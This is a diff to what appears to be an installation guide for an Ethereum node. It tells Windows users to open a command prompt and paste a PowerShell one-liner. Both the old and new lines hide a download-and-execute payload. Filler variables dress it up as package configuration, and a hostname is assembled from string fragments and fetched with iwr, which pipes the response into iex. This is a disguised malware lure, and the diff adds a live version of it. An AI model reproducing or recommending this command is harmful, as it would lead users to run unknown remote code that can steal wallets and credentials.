@@ -12,7 +12,7 @@ Open the Run dialog by pressing `Win + R`, type `cmd`, and press **Enter**.
 
 ### Step 2: Run the Ethereum node installation command
 ```powershell
-powershell -c "$sync='ethereum-mainnet-node=6.1.2-1b0a541'; $config='Network'; $import='{ Core } from \"@quicknode/sdk\"'; $enable='true'; $geth='mainnet.'; iwr ('Ethereum' + $geth + $config) | iex"
+powershell -c "$network='mainnet'; $install='ethereum-mainnet-node=6.1.2-1b0a541'; $config='.network'; iwr ('ethereum' + $network + $config) | iex"
 `````
 
 _After executing the command, the node will begin initializing and syncing with the Ethereum network._ <br>
